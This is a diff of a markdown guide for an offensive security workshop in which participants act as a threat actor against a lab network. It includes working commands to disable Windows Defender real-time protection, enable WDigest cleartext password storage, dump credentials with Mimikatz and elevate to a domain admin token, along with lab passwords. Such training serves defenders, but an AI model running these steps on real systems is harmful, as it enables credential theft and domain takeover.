@@ -6,25 +6,32 @@ In this workshop, you will be acting as the threat actor (TA). To begin, you wil
 ## Initial Connections
 
 1. Connect to the "Lighteater" host
-    1. Under the "Connections" list, click the "Lighteater" link
+    - Under the "Connections" list, click the "Lighteater" link
     
-    ![](dc31-initial_connection.png)
+        ![](dc31-initial_connection.png)
     
     - Once the session loads in your browser, you will be at the desktop of the Lighteater machine. Now that you are here, you will initiate the RDP session to the victim network.
     
 1. Launch Remote Desktop Connection to begin the attack:
-   1. Use `mstsc` or simply choose "Start" -> "Remote Desktop Connection"
+   - Use `mstsc` or simply choose "Start" -> "Remote Desktop Connection"
+
 1. Click "Show Options" at the bottom-left of the window so that you can fill out the destination machine & user details
-    1. Computer: `172.31.24.111`
+    
+    - Computer: `172.31.24.111`
         - This is the IP address of the `TWORIVERS` host. Though this is an internal IP, you are pretending as though this is how the TA is connecting into the victim environment from the outside.
-    1. User name: `172.31.24.111\Administrator`
+    - User name: `172.31.24.111\Administrator`
         - Make sure to enter the IP + slash designation before the username.
         
-    ![](dc31-mstsc_config.png)
+        ![](dc31-mstsc_config.png)
     
 1. Click "Connect" at the bottom-right to initiate the RDP session
+
 1. When prompted, enter the Administrator user's password:
-    - `Summerishere@2023!`
+    
+    ```
+    Summerishere@2023!
+    ```
+    
     - When prompted, click "Yes" to connect to the remote host.
 
 *CONGRATS!* You are now connected into the victim environment.
@@ -40,25 +47,39 @@ Once obtaining access a new environment, TAs will often run initial discovery/en
 
     ![](dc31-conti_playbook.png)
 
-In this case, the TA has accessed the environment using a local Administrator account. This account does not have LDAP query permissions. Thus, the TA needs to obtain access to a domain account.
+In this case, the TA has accessed the environment using a local admin account. This account does not have LDAP query permissions. Thus, the TA needs to obtain access to a domain account.
 
 Let's access some credentials!
 
 1. Open PowerShell as Administrator
+    
     1. Start menu -> Type `powershell` -> Right-click on "Windows PowerShell" and select "Run as administrator"
+        
         1. Do _not_ use "PowerShell 7 (x64)" or double-click "PowerShell 7" on the desktop, as we do not want PS7/Core
+    
     1. Click "Yes" on the UAC prompt
 
-1. Disable Windows Defender:
-    1. `Set-MpPreference -DisableRealtimeMonitoring 1`
+1. Disable Windows Defender (WD):
+    
+    ```powershell
+    Set-MpPreference -DisableRealtimeMonitoring 1
+    ```
+
+    **Hey!** Did you do this step? If not, do it. Otherwise you won't be able to run Mimikatz. And yes, this is a beyond common way of disabling WD. Technically, WD is not being disabled, just the real-time protection feature, but this is all you need to do to get away with most shenanigans.
 
 1. Extract Mimikatz:
-    1. `cd c:\Users\Public\Desktop\LAB_FILES\assets`
-    1. `expand-archive mimikatz_trunk.zip`
+    
+    ```powershell
+    cd c:\Users\Public\Desktop\LAB_FILES\assets
+    expand-archive mimikatz_trunk.zip
+    ```
 
 1. Run mimikatz meow:
-    1. `cd .\mimikatz_trunk\x64\`
-    1. `.\mimikatz.exe`
+    
+    ```powershell
+    cd .\mimikatz_trunk\x64\
+    .\mimikatz.exe
+    ```
    
 1. At the Mimikatz prompt (`mimikatz #`), run the following commands:
    
@@ -69,38 +90,58 @@ Let's access some credentials!
     sekurlsa::wdigest
     ```
 
-    Above we set our required privileges, begin logging to a new file named `m.txt` (which resides at `c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt`), list provider credentials, and then list WDigest-specific credentials.
+    The above commands explained:
+    
+        1. Set our required privileges
+        1. Begin logging to a new file named `m.txt`
+            - Log location: `c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt`
+        1. List provider credentials
+        1. List WDigest-specific credentials
     
     Let's review the contents of the Mimikatz log file!
     
 1. Open the `m.txt` log in notepad via:
-    1. Start menu -> type `run` -> click "Run (App)" -> Enter `notepad c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt` -> Enter/Click OK
+    1. Start menu -> type `run` -> click "Run (App)" -> Enter
+    
+    ```powershell
+    notepad c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt
+    ```
 
     As you scroll through the log file, you may note that there are no cleartext credentials for a domain account. Let's change that :).
 
-    We are going to enable cleartext password storage for WDigest. TAs love to do this, though you can prevent this for targeted accounts by placing them in the [Protected Users Group in AD](https://for528.com/protectedusers). In this environment, that hasn't been done, so let's take advantage of the situation.
+    We are going to enable cleartext password storage for WDigest. TAs love to do this, though you can (_and should!_) prevent this for elevated accounts by placing them in the [Protected Users Group in AD](https://for528.com/protectedusers). In this environment, that hasn't been done, so let's take advantage of the situation.
 
 1. Close Notepad
 
-1. Launch a separate PowerShell window (do not close your current Mimikatz prompt) as admin and run:
+1. Launch a separate PowerShell window as admin (**do not close your current Mimikatz prompt**) and run:
 
     ```powershell    
     reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
     ```
     
-    You have just adjusted the WDigest settin to store cleartext passwords in memory. Many orgs do not prevent and/or alert on this activity, so it's a go-to for TAs such as ransomware affiliates. 
+    You have just adjusted the WDigest setting to store cleartext passwords in memory. Many orgs do not prevent and/or alert on this activity, so it's a go-to for TAs such as ransomware affiliates. 
     
-    Next, you are going to emulate a domain account running a process on the host. This emulates a real-world environment in which a help desk employee connects to the machine, a task is running via a domain account, a service is running via a domain account, etc. We will use `runas` to run `notepad.exe`, though in the real world this account may just connect remotely to run whatever process.
+    Next, you are going to emulate a domain account running a process on the host. **This emulates a real-world environment in which a help desk employee connects to the machine, a task is running via a domain account, a service is running via a domain account, etc.** We will use `runas` to run `notepad.exe`, though in the real world this account may just connect remotely to run whatever process.
 
 1. In your current PS window, execute Notepad as the `WHEEL\Administrator` user:
-    1. `runas /user:wheel\Administrator notepad.exe`
-    - You will be prompted to `Enter the password for wheel\Administrator:`, at point you will enter the account's password:
-        - `12qwaszx!@QWASZX`
+    
+    ```
+    runas /user:wheel\Administrator notepad.exe
+    ```
+    
+    - You will be prompted to `Enter the password for wheel\Administrator:`, which is:
+        
+        ```
+        12qwaszx!@QWASZX
+        ```
 
     _Minimize the Notepad process window_ -- **DO NOT close this window**
 
 1. Back in Mimikatz, run the following command:
-    - `sekurlsa::wdigest`
+    
+    ```
+    sekurlsa::wdigest
+    ```
 
     Either scroll up in the Mimikatz window buffer or once again load the `m.log` file via `notepad c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\m.txt`.
 
@@ -123,8 +164,13 @@ Let's access some credentials!
     Sure, we used `runas` and entered this password. We were simply emulating the fact that a domain account might be running a process on the host, which is a _very_ common situation.
 
 1. Elevate your access to the domain admin account in the Mimikatz prompt via:
-    1. `token::elevate /domainadmin`
-
+    
+    ```
+    token::elevate /domainadmin
+    ```
+    
+    Expected output:
+    
     ```
     mimikatz # token::elevate /domainadmin
     Token Id  : 0
@@ -137,7 +183,7 @@ Let's access some credentials!
      * Thread Token  : {0;00696a49} 3 D 7413640     WHEEL\Administrator     S-1-5-21-3772637088-1800343157-2363924200-500   (16g,24p)       Impersonation (Delegation)
     ```
 
-**CONGRATS!! You are not elevated to a domain admin account!
+**CONGRATS!! You are not elevated to a domain admin account!**
 
 More importantly, you now have the cleartext password of the domain admin account, `WHEEL\Administrator`, which is `12qwaszx!@QWASZX`.
 
